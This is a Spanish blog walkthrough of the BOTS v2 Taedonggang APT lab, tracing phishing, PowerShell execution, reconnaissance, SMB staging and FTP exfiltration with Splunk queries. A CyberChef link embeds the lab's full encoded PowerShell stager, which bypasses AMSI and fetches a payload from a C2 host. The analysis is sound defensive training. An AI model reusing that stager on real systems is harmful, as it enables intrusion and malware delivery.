---
layout: single
title: "BOTS Taedonggang APT - Parte 1 "
author_profile: true
published: true
toc: true
toc_sticky: true
---

Las simulaciones de __Boss of the SOC (BOTS)__ son entornos gamificados que nos permiten fortalecer nuestras habilidades como __Blue Team__, aunque en escenarios como **Taedonggang APT**, también exploramos técnicas propias del __Red Team__, especialmente en las etapas iniciales de una intrusión.

![UTMP]({{ "/images/BOTS-Parte1/logo.png" | relative_url }}){: .align-center style="max-height: 450px;"}


En este escenario, nos enfrentamos a una campaña simulada de un actor avanzado persistente (_APT_), donde debemos identificar y analizar los vectores de __acceso inicial__, así como realizar un profundo __reconocimiento__ de la infraestructura comprometida. Aquí no buscamos tomar control total de una máquina, sino entender cómo lo haría un atacante real y cómo podríamos detectarlo.

Durante el reto, ponemos en práctica técnicas como:

- _Análisis de logs_ para detectar patrones sospechosos  
- _Revisión de artefactos de acceso remoto_ como credenciales o herramientas de administración  
- _Identificación de TTPs_ (Técnicas, Tácticas y Procedimientos) asociadas a grupos APT  
- _Reconstrucción de la línea de tiempo_ del ataque para entender su progresión  

Este tipo de laboratorios nos ayuda a afinar el ojo analítico, comprender el comportamiento adversario y fortalecer nuestras capacidades de detección temprana. En **Taedonggang APT**, cada pista cuenta, y cada hallazgo nos acerca más a entender cómo se infiltran los atacantes… y cómo podemos detenerlos.

## Primer escenario: Acceso Inicial

La primera tarea está en investigar el acceso inicial de un atacate; para los que no estén familiarizados en el proceso, primero, no te puedes lanzar como si nada a investigar logs a diestra y siniestra; lo primero que ocupas es una hipótesis y luego, en investigar alrededor de está hipótesis.

Entonces, partimos pensando __¿Cuál es la vulnerabilidad más utilizada actualmente para alcanzar el acceso inicial?__, la respuesta, claramente, sería el phishing así que empecemos a plantear preguntas: __¿Cuál es la forma más común de entregar phishing?__ __¿Nuestras fuentes de logs cubren algo así?__ __¿Qué tipos de adjuntos podríamos buscar?__.

Para empezar entonces, investiguemos cuáles son los tipos de datos que tenemos y para averiguarlo tendremos varias alternativas:

```js
index="*" | stats count by sourcetype
```
_Esta búsqueda mostrará todos los sourcetypes de todos los index_

```js
| metadata type=sourcetypes index="*" | eval firstTime=strftime(firstTime,"%Y-%m-%d %H-%M-%S") | eval lastTime=strftime(lastTime, "%Y-%m%d %H-%M-%S") | eval recentTime=strftime(recentTime, "%Y-%m-%d %H-%M-%S")
```
_Esta búsqueda mostrará todos los sourcetypes de todos los index con su rango de fechas_

Claro, que para trabajar, nos tendrán que decir o al menos, saber, con qué _index_ estaremos trabajando y también, si el incidente a investigar tiene otra fecha en específico o si tenemos que estar trabajando con datos en tiempo real, en cualquier caso, mientras nos den información, tenemos que aprovecharla para nuestro análisis.

* Agosto 2017
* index: botsv2

```js
| metadata type=sourcetypes index="botsv2" | eval firstTime=strftime(firstTime,"%Y-%m-%d %H-%M-%S") | eval lastTime=strftime(lastTime, "%Y-%m%d %H-%M-%S") | eval recentTime=strftime(recentTime, "%Y-%m-%d %H-%M-%S")
```
_Ajustamos nuestro index y también filtramos DESDE 01/Agosto/2017_

Y pronto veremos cuántas fuentes disponibles tenemos:

![UTMP]({{ "/images/BOTS-Parte1/SourcesSP.png" | relative_url }}){: .align-center}

_No debe asustarnos el número, asústate cuando no tengas la fuente que necesites hahaha_

Pronto visualizamos una fuente que nos sirve directamente en nuestra hipótesis: El protocolo SMTP (_Simple Mail Transfer Protocol_) que cubriría mails maliciosos.

![UTMP]({{ "/images/BOTS-Parte1/smtplogvis.png" | relative_url }}){: .align-center}

Ahora, podemos filtrar todos los eventos desde esta fuente:

```js
index=botsv2 sourcetype="stream:smtp"
```

Ahora, lo importante es familiarizarnos con el formato y los campos que tiene cada log; no hace falta ver cada uno de los logs, sino intentar imaginar qué campos cubre o no nuestra fuente; para tirar un poco a la suerte, podemos intentar buscar algo como _'attachment'_ para buscar algún contenido/documento adjunto que haya sido enviado por este medio; entonces accedemos dando clic...

![UTMP]({{ "/images/BOTS-Parte1/searchvalues.png" | relative_url }}){: .align-center}

Y buscamos

![UTMP]({{ "/images/BOTS-Parte1/attachsearch.png" | relative_url }}){: .align-center}

Añadimos entonces el campo a la búsqueda:

```js
index=botsv2 sourcetype="stream:smtp"  "attach_filename{}"="*"
```

Lo que nos mostrará sólo los correos que hayan tenido un adjunto en él. Con los primeros resultados, podemos afinar y presentar mejor los resultados para que sea más digerible:

```js
index=botsv2 sourcetype="stream:smtp" "attach_filename{}"="*" | table sender_email, receiver_email,  subject,  attach_filename{},  attach_content_md5_hash{}, date
```
_Esta búsqueda mostrará en una tabla los campos del remitente, destinatario, asunto, el nombre del adjunto, su md5 y la fecha_

En los resultados, tenemos varios adjuntos interesantes; en primera, los 4 archivos `zip` y luego los 4 `txt` exactamente a los mismos destinatarios:

![UTMP]({{ "/images/BOTS-Parte1/SPZip.png" | relative_url }}){: .align-center}

La sospecha puede aumentar bastante, ya que la diferencia de las fechas y los adjuntos sujieren un comportamiento sospechoso, podemos examinar los mensajes para aclarar dudas:

![UTMP]({{ "/images/BOTS-Parte1/SPMail.png" | relative_url }}){: .align-center}

Parece un motivo muy sospechoso para eviar un comprimido de esta manera, para confirmar continuemos con los que tienen el `txt`, que nos indica un mensaje en base64:

![UTMP]({{ "/images/BOTS-Parte1/SPMailBase64.png" | relative_url }}){: .align-center}

Este mensaje parece ser generado por la protección del correo electrónico; la alarma de un Phishing (__Spearphishing__) se confirma cuando notas que el archivo que generó la alerta tiene el mismo nombre que el comprimido enviado tiempo después, por el mismo remitente.

## Primer escenario, Segunda parte: Ejecución

Una vez confirmado la existencia de un archivo malicioso, lo que sigue es investigar qué acciones se realizaron en los equipos infectados; _¿Qué fuentes de logs pueden cubrir ejecuciones?_ _¿Deberíamos buscar eventos antes o después del spearphishing?_ _¿Logró ejecutarse en el equipo?_  _¿Qué otros indicadores tenemos?_

Estas preguntas nos guiarán en nuestra hipótesis de ejecución de comandos, así que empecemos por investigar qué equipos o usuarios, recibieron el archivo; la manera fácil, es buscar la extensión en el `sysmon` (que, está disponible en nuestras fuentes) y claro, __filtrando después del spearphishing__

```js
index="botsv2" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" zip | sort + UtcTime
```
_Esta búsqueda busca en el Operational en busca del string 'zip', ordenando por los menos recientes_

Con esta búsqueda, podemos notar que ya encontramos algunas ejecuciones:

![UTMP]({{ "/images/BOTS-Parte1/invoicezip.png" | relative_url }}){: .align-center}

Entonces aprovechamos este log para enriquecer la búsqueda; entonces veamos si fue el único host afectado:

```js
index="botsv2" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" invoice.zip | sort + UtcTime | table host, TargetFilename
```

![UTMP]({{ "/images/BOTS-Parte1/invoiceExec.png" | relative_url }}){: .align-center}

Ya confirmado, podemos investigar las acciones del archivo sobre el host:

```js
index="botsv2" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" invoice.zip  host="wrk-btun" | sort + UtcTime 
```

![UTMP]({{ "/images/BOTS-Parte1/windowsword.png" | relative_url }}){: .align-center}

Esto nos está indicando que el usuario abrió el archivo con `Word`, lo que puede seguir de aquí es ejecución de comandos tanto por `powershell` como por `cmd`, iniciemos con `powershell`:

```js
index="botsv2" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" Computer="wrk-btun.frothly.local" Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" | sort + UtcTime
```
_Image es el campo del programa ejecutado relacionado con el log en la computadora afectada_

El primer resultado devuelto va a saltar a la vista, un poco por el tamaño pero especialmente el `-nop -w 1 -enc`; que indica: _Ejecutar sin cargar el perfil del usuario, de forma oculta el siguiente script en base64_ (Todo indicando __evasión__) entonces, investigamos el payload con la siguiente receta de [Cyberchef](https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',false,false)Decode_text('UTF-16LE%20(1200)')&input=V3dCU0FFVUFSZ0JkQUM0QVFRQlRBRk1BUlFCdEFHSUFiQUJaQUM0QVJ3QmxBRlFBVkFCWkFGQUFaUUFvQUNjQVV3QjVBSE1BZEFCbEFHMEFMZ0JOQUdFQWJnQmhBR2NBWlFCdEFHVUFiZ0IwQUM0QVFRQjFBSFFBYndCdEFHRUFkQUJwQUc4QWJnQXVBRUVBYlFCekFHa0FWUUIwQUdrQWJBQnpBQ2NBS1FCOEFEOEFld0FrQUY4QWZRQjhBQ1VBZXdBa0FGOEFMZ0JIQUdVQWRBQkdBRWtBUlFCTUFHUUFLQUFuQUdFQWJRQnpBR2tBU1FCdUFHa0FkQUJHQUdFQWFRQnNBR1VBWkFBbkFDd0FKd0JPQUc4QWJnQlFBSFVBWWdCc0FHa0FZd0FzQUZNQWRBQmhBSFFBYVFCakFDY0FLUUF1QUZNQVpRQjBBRllBWVFCTUFIVUFaUUFvQUNRQWJnQjFBRXdBYkFBc0FDUUFWQUJ5QUhVQVJRQXBBSDBBT3dCYkFGTUFXUUJ6QUZRQVJRQk5BQzRBVGdCbEFIUUFMZ0JUQUdVQWNnQldBRWtBWXdCRkFGQUFUd0JwQUc0QVZBQk5BRUVBYmdCQkFFY0FSUUJ5QUYwQU9nQTZBRVVBV0FCUUFFVUFZd0JVQURFQU1BQXdBRU1BVHdCT0FIUUFhUUJ1QUhVQVpRQTlBREFBT3dBa0FIY0FRd0E5QUU0QVJRQjNBQzBBVHdCQ0FHb0FSUUJEQUZRQUlBQlRBSGtBY3dCVUFHVUFiUUF1QUU0QVJRQjBBQzRBVndCbEFFSUFRd0JzQUdrQVJRQnVBRlFBT3dBa0FIVUFQUUFuQUUwQWJ3QjZBR2tBYkFCc0FHRUFMd0ExQUM0QU1BQWdBQ2dBVndCcEFHNEFaQUJ2QUhjQWN3QWdBRTRBVkFBZ0FEWUFMZ0F4QURzQUlBQlhBRThBVndBMkFEUUFPd0FnQUZRQWNnQnBBR1FBWlFCdUFIUUFMd0EzQUM0QU1BQTdBQ0FBY2dCMkFEb0FNUUF4QUM0QU1BQXBBQ0FBYkFCcEFHc0FaUUFnQUVjQVpRQmpBR3NBYndBbkFEc0FXd0JUQUhrQWN3QjBBR1VBYlFBdUFFNEFaUUIwQUM0QVV3QmxBSElBZGdCcEFHTUFaUUJRQUc4QWFRQnVBSFFBVFFCaEFHNEFZUUJuQUdVQWNnQmRBRG9BT2dCVEFHVUFjZ0IyQUdVQWNnQkRBR1VBY2dCMEFHa0FaZ0JwQUdNQVlRQjBBR1VBVmdCaEFHd0FhUUJrQUdFQWRBQnBBRzhBYmdCREFHRUFiQUJzQUdJQVlRQmpBR3NBSUFBOUFDQUFld0FrQUhRQWNnQjFBR1VBZlFBN0FDUUFWd0JqQUM0QVNBQmxBRUVBUkFCbEFISUFjd0F1QUVFQVpBQmtBQ2dBSndCVkFITUFaUUJ5QUMwQVFRQm5BR1VBYmdCMEFDY0FMQUFrQUhVQUtRQTdBQ1FBVndCakFDNEFVQUJTQUU4QVdBQjVBRDBBV3dCVEFIa0Fjd0IwQUdVQWJRQXVBRTRBUlFCMEFDNEFWd0JGQUVJQVVnQmxBSEVBZFFCbEFGTUFWQUJkQURvQU9nQkVBR1VBWmdCQkFGVUFiQUIwQUZjQVpRQmlBRkFBY2dCUEFIZ0FlUUE3QUNRQVZ3QkRBQzRBVUFCU0FHOEFlQUI1QUM0QVF3QlNBRVVBUkFCbEFFNEFkQUJKQUVFQWJBQnpBQ0FBUFFBZ0FGc0FVd0I1QUZNQWRBQmxBRTBBTGdCT0FFVUFWQUF1QUVNQVVnQmxBR1FBUlFCT0FIUUFhUUJCQUd3QVF3QkJBRU1BYUFCRkFGMEFPZ0E2QUVRQVpRQkdBRUVBZFFCc0FGUUFUZ0JGQUZRQVZ3QnZBRklBYXdCREFISUFaUUJFQUVVQVRnQlVBRWtBWVFCc0FGTUFPd0FrQUVzQVBRQmJBRk1BZVFCekFGUUFaUUJ0QUM0QVZBQkZBSGdBZEFBdUFFVUFUZ0JqQUU4QVpBQnBBRTRBUndCZEFEb0FPZ0JCQUZNQVF3QkpBRWtBTGdCSEFHVUFkQUJDQUZrQVZBQmxBSE1BS0FBbkFETUFPQUE1QURJQU9BQTRBR1VBWkFCa0FEY0FPQUJsQURnQVpRQmhBRElBWmdBMUFEUUFPUUEwQURZQVpBQXpBRElBTUFBNUFHSUFNUUEyQUdJQU9BQW5BQ2tBT3dBa0FGSUFQUUI3QUNRQVJBQXNBQ1FBU3dBOUFDUUFRUUJ5QUdjQVV3QTdBQ1FBVXdBOUFEQUFMZ0F1QURJQU5RQTFBRHNBTUFBdUFDNEFNZ0ExQURVQWZBQWxBSHNBSkFCS0FEMEFLQUFrQUVvQUt3QWtBRk1BV3dBa0FGOEFYUUFyQUNRQVN3QmJBQ1FBWHdBbEFDUUFTd0F1QUVNQVR3QlZBRTRBVkFCZEFDa0FKUUF5QURVQU5nQTdBQ1FBVXdCYkFDUUFYd0JkQUN3QUpBQlRBRnNBSkFCS0FGMEFQUUFrQUZNQVd3QWtBRW9BWFFBc0FDUUFVd0JiQUNRQVh3QmRBSDBBT3dBa0FFUUFmQUFsQUhzQUpBQkpBRDBBS0FBa0FFa0FLd0F4QUNrQUpRQXlBRFVBTmdBN0FDUUFTQUE5QUNnQUpBQklBQ3NBSkFCVEFGc0FKQUJKQUYwQUtRQWxBRElBTlFBMkFEc0FKQUJUQUZzQUpBQkpBRjBBTEFBa0FGTUFXd0FrQUVnQVhRQTlBQ1FBVXdCYkFDUUFTQUJkQUN3QUpBQlRBRnNBSkFCSkFGMEFPd0FrQUY4QUxRQkNBRmdBYndCU0FDUUFVd0JiQUNnQUpBQlRBRnNBSkFCSkFGMEFLd0FrQUZNQVd3QWtBRWdBWFFBcEFDVUFNZ0ExQURZQVhRQjlBSDBBT3dBa0FGY0FRd0F1QUVnQVpRQmhBRVFBWlFCU0FGTUFMZ0JCQUdRQVpBQW9BQ0lBUXdCdkFHOEFhd0JwQUdVQUlnQXNBQ0lBY3dCbEFITUFjd0JwQUc4QWJnQTlBR29BYXdCdUFGZ0FjQUJ2QUdFQU53QndBRlVBUVFBd0FHd0FSQUJDQUNzQWJnQlpBR2tBVVFCMkFGVUFPUUIxQUc0QVNBQm5BRDBBSWdBcEFEc0FKQUJ6QUdVQWNnQTlBQ2NBYUFCMEFIUUFjQUJ6QURvQUx3QXZBRFFBTlFBdUFEY0FOd0F1QURZQU5RQXVBRElBTVFBeEFEb0FOQUEwQURNQUp3QTdBQ1FBZEFBOUFDY0FMd0JzQUc4QVp3QnBBRzRBTHdCd0FISUFid0JqQUdVQWN3QnpBQzRBY0FCb0FIQUFKd0E3QUNRQVJBQkJBRlFBUVFBOUFDUUFWd0JEQUM0QVJBQnZBRmNBYmdCTUFHOEFRUUJrQUVRQVlRQlVBR0VBS0FBa0FGTUFSUUJ5QUNzQUpBQjBBQ2tBT3dBa0FFa0FWZ0E5QUNRQVJBQkJBRlFBWVFCYkFEQUFMZ0F1QURNQVhRQTdBQ1FBWkFCQkFGUUFZUUE5QUNRQVJBQmhBRlFBUVFCYkFEUUFMZ0F1QUNRQVpBQmhBRlFBWVFBdUFFd0FaUUJPQUVjQWRBQklBRjBBT3dBdEFHb0Fid0JwQUU0QVd3QkRBRWdBWVFCeUFGc0FYUUJkQUNnQUpnQWdBQ1FBVWdBZ0FDUUFaQUJoQUhRQVlRQWdBQ2dBSkFCSkFGWUFLd0FrQUVzQUtRQXBBSHdBU1FCRkFGZ0E):


Que hace algunas cosas:

1. Hace un bypass del AMSI (evasión del host)
2. Desactiva Expect100Continue (evasión del firewall)
3. Configura el WebClient para simular un Internet Explorer
4. Configura el Proxy del sistema utilizando las credenciales del usuario actual
5. Añade una clave de descifrado
6. Añade una cookie y se conecta al C2
7. Extrae el `IV` y descifra el payload

Ya confirmado nuestra hipótesis, también podemos correlacionar los procesos para saber qué otras acciones o programas se ejecutaron:

```js
index="botsv2" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" Computer="wrk-btun.frothly.local" user="FROTHLY\\billy.tun" | sort + UtcTime | table _time, process, process_id , parent_process, parent_process_id, CommandLine
```
_Esto revela los logs ejecutados por el usuario y en el equipo infectado, mostrando el programa ejecutado mostrando la linea de comandos_

Para tener una forma de trazabilidad clara, qué acciones y programas se ejecutaron después para crear todo el árbol de procesos:

![UTMP]({{ "/images/BOTS-Parte1/ProcessTree.png" | relative_url }}){: .align-center}

## Segundo escenario: Reconocimiento

Ahora, si recordamos el concepto de la `Cyber Kill Chain`, el reconocimiento es algo complicado, pero no imposible, sólo hay que tener una hipótesis clara sabiendo lo que queremos buscar y aplicar filtrado poco a poco

Entonces, para aplicar el filtrado, necesitamos un campo que sea algo general para no perder de vista algún evento relevante

Lo que podemos plantear es con el `User-Agent` es si hay algo anómalo, el si ese `UA` hace peticiones a ciertos archivos y tratar de hacer el seguimiento a sus acciones.

Entonces empezamos a buscar la fuente relevante (`stream:http`) para ver cómo está organizado:

```js
index="botsv2" sourcetype="stream:http"
```

![UTMP]({{ "/images/BOTS-Parte1/UASearch.png" | relative_url }}){: .align-center}

Ya sabiendo que es nuestra fuente relevante, podemos empezar a organizar para filtrar

```js
index="botsv2" sourcetype="stream:http" | stats count by http_user_agent | sort - count
```

La busqueda nos mostrará una tabla con los `UA` más comunes, pero bajando podremos encontrarnos con algunos interesantes como los siguientes

![UTMP]({{ "/images/BOTS-Parte1/SuspiciousUA.png" | relative_url }}){: .align-center}

Dejando de ladito a los intentos de ejecución de comandos, debemos observar el `NaenaraBrowser`; `Naenara Browser` es un navegador de Corea del Norte, esto puede ser un indicador que pueda llevarnos a algo, especialmente porque no es muy común. Entonces bajo sospecha del User Agent, hacemos OSINT a la IP, para verla, podemos ver el campo ` src_ip` en el log que corresponda (85.203.47.86).

Buscando con `iplocation.net` encontramos la ubicación del ISP de la IP y no es Corea del Norte.

![UTMP]({{ "/images/BOTS-Parte1/OSINTIP.png" | relative_url }}){: .align-center}

Buscando ahora la organización propietaria de la IP, podemos encontrar también que es de un servicio de infraestructura de TI, incluyendo VPS.

![UTMP]({{ "/images/BOTS-Parte1/glesys.png" | relative_url }}){: .align-center}

### Extracción de archivos públicos

Bien, ahora sigue hacer la traza de las acciones realizadas, una búsqueda sencilla puede ser buscar el tipo de contenido (para tener una visión general y rápida de lo que buscaba), el `uri_path` para saber exactamente qué directorio está solicitando, el código HTTP (para saber si fue exitoso o no) y el timestamp (para saber cuándo lo hizo):

```js
index="botsv2" sourcetype="stream:http" http_user_agent="Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4" | table  http_content_type, uri_path, status, timestamp
```

Donde una de las entradas tiene un nombre alarmante:

![UTMP]({{ "/images/BOTS-Parte1/file-extraction.png" | relative_url }}){: .align-center}

Lo que sigue es saber ¿qué contenía este archivo?, ¿cuántos son los afectados? y volver a armar nuestras hipótesis desde aquí como parte del proceso defensivo.

## Tercer Escenario: Preparación Remota de Datos

La siguiente tarea va con la hipótesis de que los datos fueron preparados para la exfiltración, específicamente, la subtécnica reconoce que un atacante, para facilitar la tarea del robo/salida de datos, debe prepararse en algún lugar centralizado para facilitar las tareas posteriores; bajo este criterio, podemos preaparar nuestras preguntas _¿Qué fuentes nos pueden indicar una preaparación de datos?_ _¿Qué flujo de datos puede indicar una preparación de los datos?_ _¿Qué tipos de datos podemos imaginarnos que están preparándose?_ _¿Hay actividad posterior indicando el exfiltrado de los datos?_ _¿Qué cuentas de usuarios pudieron usarse para la preparación?_ 

Primero, veamos qué fuentes de logs capturaron movimientos de archivos:

```js
index="botsv2" (docx OR doc OR pdf OR xls OR xlsx) | stats count by source
```
_Estamos buscando en los sources la cantidad de logs que mencionen algunas extensiones de archivos de oficina comunes_

Esta búsqueda nos da la idea de qué logs utilizar:

![UTMP]({{ "/images/BOTS-Parte1/DataStagingExt.png" | relative_url }}){: .align-center}

`SMB` puede ser un excelente punto de partida ya que es de los protocolos más comunes a la hora de compartir archivos en entornos grandes junto con FTP, probemos primero SMB.

### Logs SMB

Iniciamos con una búsqueda para saber qué host fue el que más actividad tuvo en cuanto a operaciones con SMB:

```js
index="botsv2" source="stream:smb" (docx OR doc OR pdf OR xls OR xlsx) | stats count by src_ip, dest_ip | sort - count
```

Desde aquí podemos ver el principal cliente (más de 1700 peticiones en muy poco tiempo)

![UTMP]({{ "/images/BOTS-Parte1/DataStagingSMB.png" | relative_url }}){: .align-center}

Claramente, esto indica una alarma de la gran cantidad de archivos transferidos; para ver qué archivos se han movido, puedes utilizar una query más descriptiva añadiendo algunos campos extras del tipo de log `stream:smb`

Primero veamos cómo se registran las operaciones en el log:

```js
index="botsv2" source="stream:smb" src_ip=10.0.2.107 | stats count by command
```

Esto nos muestra los varios valores en el campo `command`

![UTMP]({{ "/images/BOTS-Parte1/SMBCommands.png" | relative_url }}){: .align-center}

Al que debemos poner atención es `smb2 create` que se genera cuando se crea, abre o accede a un archivo en el servidor SMB:

```js
index="botsv2" source="stream:smb" src_ip=10.0.2.107  command="smb2 create" filename!="*Zone.Identifier" | table filename, _time | dedup filename
```
_Estamos filtrando el `Zone.Identifier` ya que esta extensión la genera el cliente windows cuando se descarga un archivo de una fuente externa._

Esta búsqueda refleja qué archivos fueron movidos por el atacante.

![UTMP]({{ "/images/BOTS-Parte1/DataStagingPDF.png" | relative_url }}){: .align-center}

De momento, el atacante ha movido los archivos, pero debemos investigar ahora la transferencia por una posible filtración de datos.

### Logs FTP

El siguiente protocolo es FTP, para ello, utilizamos el source `stream:ftp` (Hay más formas de filtrar datos pero es un buen punto de partida)

```js
index="botsv2" source="stream:ftp" src_ip=10.0.2.107
```
_Primero correlacionamos la IP con el uso del protocolo, aprovechando para conocer la forma del log_

Ahora sabiendo la lógica del log, podemos modificarlo un poco para ver con qué servidor se está conectando:

```js
index="botsv2" source="stream:ftp" src_ip=10.0.2.107 | stats count by dest_ip, src_ip
```

Con esta búsqueda podrás saber cuántos logs se generaron correlacionando su comunicación; Con esto, confirmamos el filtrado de los archivos.

![UTMP]({{ "/images/BOTS-Parte1/FTPExfiltration.png" | relative_url }}){: .align-center}

###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!.

